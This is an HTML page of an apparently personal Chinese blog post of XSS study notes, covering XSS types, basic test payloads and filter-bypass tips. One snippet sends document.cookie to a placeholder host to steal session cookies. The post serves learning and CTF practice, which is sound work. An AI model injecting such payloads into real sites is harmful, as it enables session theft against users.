@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>关于xss的一些学习心得 | Iuhrey的幻想乡</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言按照惯例，开头还是逼逼几句，本来这一篇我昨天就写好了，可是处理的时候不小心删了，所以就只能重新写一篇了，关于xss呢，很早之前就接触过但是一直没系统的学，只是为了做xss的题目而做题目所以这一次系统的归纳一下，也算是个备忘录吧。   何为XSSXSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本">
+<meta name="keywords" content="Web XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于xss的一些学习心得">
+<meta property="og:url" content="http://yoursite.com/2018/06/01/关于xss的一些学习心得/index.html">
+<meta property="og:site_name" content="Iuhrey的幻想乡">
+<meta property="og:description" content="前言按照惯例，开头还是逼逼几句，本来这一篇我昨天就写好了，可是处理的时候不小心删了，所以就只能重新写一篇了，关于xss呢，很早之前就接触过但是一直没系统的学，只是为了做xss的题目而做题目所以这一次系统的归纳一下，也算是个备忘录吧。   何为XSSXSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-06-01T11:55:42.317Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="关于xss的一些学习心得">
+<meta name="twitter:description" content="前言按照惯例，开头还是逼逼几句，本来这一篇我昨天就写好了，可是处理的时候不小心删了，所以就只能重新写一篇了，关于xss呢，很早之前就接触过但是一直没系统的学，只是为了做xss的题目而做题目所以这一次系统的归纳一下，也算是个备忘录吧。   何为XSSXSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本">
+  
+    <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="source/images/favicon.ico" />
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">Iuhrey</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>16</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>7</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>幻想乡的起点</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>幻想乡图</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分岔路</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>路标</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-关于xss的一些学习心得" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/01/关于xss的一些学习心得/" class="article-date">
+  <time class="post-time" datetime="2018-06-01T10:26:17.000Z" itemprop="datePublished">
+    <span class="post-month">6月</span><br/>
+    <span class="post-day">01</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      关于xss的一些学习心得
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
+  </div>
+
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>按照惯例，开头还是逼逼几句，本来这一篇我昨天就写好了，可是处理的时候不小心删了，所以就只能重新写一篇了，关于xss呢，很早之前就接触过但是一直没系统的学，只是为了做xss的题目而做题目所以这一次系统的归纳一下，也算是个备忘录吧。  </p>
+<h2 id="何为XSS"><a href="#何为XSS" class="headerlink" title="何为XSS"></a>何为XSS</h2><p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。<strong>(摘自百度百科)</strong><br>以上的说明呢，是官方的。不过根据我的理解来说，XSS攻击是攻击者把构造的恶意代码插入到网页源码中，通过跳转，执行事件等方式来达到获取信息，执行恶意代码等目的。  </p>
+<h2 id="XSS攻击的分类"><a href="#XSS攻击的分类" class="headerlink" title="XSS攻击的分类"></a>XSS攻击的分类</h2><p>一般来说XSS攻击分为三种。<br>第一种是反射型XSS，反射性XSS只是简单地把用户输入的数据”反射”给浏览器，也就是说攻击者必须让攻击点击所构造的恶意链接才能给攻击者反馈消息或者执行非本人意愿的命令。这一种反馈是即时性的，也是一次性的，也就是即输即用，也叫做”非持久型XSS”<br>第二种是储存型XSS，储存型XSS会把攻击者所构造的恶意代码储存到后端的数据库中，只要有用户一旦浏览到恶意代码的页面便会执行攻击的代码，被窃取登入验证等信息，攻击者便可以假冒”代表”用户进行操作。<br>第三种是基于Dom的XSS，这一种XSS攻击和反射型差不多，也算是反射型的一种，这种类型的攻击一般是攻击者构造一些事件，或者调用js里面一些函数来实现的，所以具体来说这种和第一种区分不算太大。  </p>
+<h2 id="XSS一些Payload"><a href="#XSS一些Payload" class="headerlink" title="XSS一些Payload"></a>XSS一些Payload</h2><p>其实来说呢，xss的payload也不是类似sql注入一样固定的，xss的payload一般来说是变化多样，根据其html的代码来进行构造的。<br>这是最为基础，也是常用于测试的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">```  </span><br><span class="line">这里面包含了标签，也包含了alert()函数，一般来说是可以测试出一些东西的。  </span><br><span class="line">还有例如这种的payload</span><br></pre></td></tr></table></figure></p>
+<p><img scr="#" onerror="alert(1)"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这种是通过构造一个错误，触发onerror事件弹出alert(1)。  </span><br><span class="line">还有类似这种</span><br></pre></td></tr></table></figure></p>
+<p><script><br>var i=new Image;<br>i.src=”<a href="http://xxxx.xxxx.xxx&quot;+document.cookies">http://xxxx.xxxx.xxx&quot;+document.cookies</a>;<br></script><br><code>`</code><br>这种就是通过点击恶意链接，然后用户的信息就被窃取了。<br><strong>以上只是几种简单的Payload，其余的类型实在是太过复杂了，多做题目才能有更多的经验</strong>  </p>
+<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>这个就大致说一下吧，之后会在练习中讲解一些的。主要分为以下几种。<br><strong>1 编码绕过</strong>根据网页过滤的代码，以及代码执行的环境进行合适的编码转化，例如他在后台过滤<strong>&lt;&gt;</strong>这个东西，那我们可以通过%3c%3e来绕过，也可以\0x3c来绕过。<br><strong>2 字符限制</strong>一般网页会限制输入的长度，我们可以进行简化代码，也可以直接更改源码中的maxlength要素来修改字符长度上限。<br><strong>3 使用标签</strong>灵活使用标签也是可以达到同样的效果的。<br>一些其他的方式也是需要在实战中进行磨练出来的，之后会写一篇XSS练习平台的wp，详细说一些思路。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjhvwx83q001028vea6qs261f" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-XSS/">Web XSS</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/05/25/ISCC之Web的一些wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">ISCCC Web的一些wp</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+  <div id="comments" class="comments">
+    <div id="uyan_frame"></div>
+  </div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2158764"></script>
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Iuhrey的幻想乡</h1>
+    <h2 class="blog-subtitle"></h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>幻想乡的起点</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>幻想乡图</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分岔路</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>路标</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">Iuhrey</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>16</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>7</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/NoneGirlIuh" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://mozhucy.cn/" target="_blank" title="喜欢啥几把BB的狗骑驴">
+          喜欢啥几把BB的狗骑驴
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://alittlexyz.cn/" target="_blank" title="喜欢gay在狗骑驴旁边的狗逼">
+          喜欢gay在狗骑驴旁边的狗逼
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
+          gay里gay气的大黄
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://yulige.top/" target="_blank" title="郁离歌大手子的博客">
+          郁离歌大手子的博客
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://shaobaobaoer.cn/" target="_blank" title="有很多小姐姐的烧包包">
+          有很多小姐姐的烧包包
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=22817222&auto=1&height=66"></iframe>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 Iuhrey<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+        |<script src="http://s11.cnzz.com/z_stat.php?id=1273056144&web_id=1273056144" language="JavaScript"></script>
+      
+    </div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_uv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
